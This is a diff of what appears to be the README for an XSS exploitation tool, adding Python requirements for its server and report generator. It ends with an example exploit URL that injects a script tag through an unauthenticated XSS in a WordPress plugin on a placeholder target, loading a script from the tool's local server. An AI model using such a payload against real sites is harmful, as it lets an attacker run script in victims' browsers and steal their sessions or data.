@@ -8,9 +8,14 @@ Do not use this tool for illegal purposes, or I will be very angry in your gener
 
 
 Pip requirements: 
+
+Server ones:
 flask
 flask-cors
 
+Generator ones:
+dataframe_image
+fpdf
 
 
 https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%20src=%27http://localhost:8444/lib/telemlib.js%27%3E%3C/script%3E
